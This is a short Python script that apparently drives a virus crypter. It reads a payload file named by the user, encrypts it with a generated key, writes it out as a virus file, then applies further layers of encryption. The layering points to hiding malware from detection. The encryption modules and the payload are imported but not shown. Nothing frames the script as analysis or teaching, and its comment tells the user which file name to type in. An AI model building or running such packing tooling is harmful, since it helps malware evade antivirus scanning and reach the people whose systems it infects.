import virus_encryption
import recursively_encrypt_decryption
import os

file_name = ""

def create_first_encrypted_file():
  global file_name
  file_name = virus_encryption.ask_for_filename()

  virus_encryption.read_payload(file_name + '.py')
  virus_encryption.generate_key()
  virus_encryption.encrypt_payload()
  virus_encryption.write_virus(file_name + "_e0.py")

def recursively_encrypt():
  recursively_encrypt_decryption.original_filename = file_name
  recursively_encrypt_decryption.level_of_encryption()
  recursively_encrypt_decryption.encrypt_decryption.file_name = file_name + "_e0.py"
  recursively_encrypt_decryption.encrypt_loop()

# TYPE IN THE NAME OF THE FILE YOU WANT TO ENCRYPT WITHOUT THE EXTENSION .PY
if __name__ == '__main__':
  create_first_encrypted_file()
  recursively_encrypt()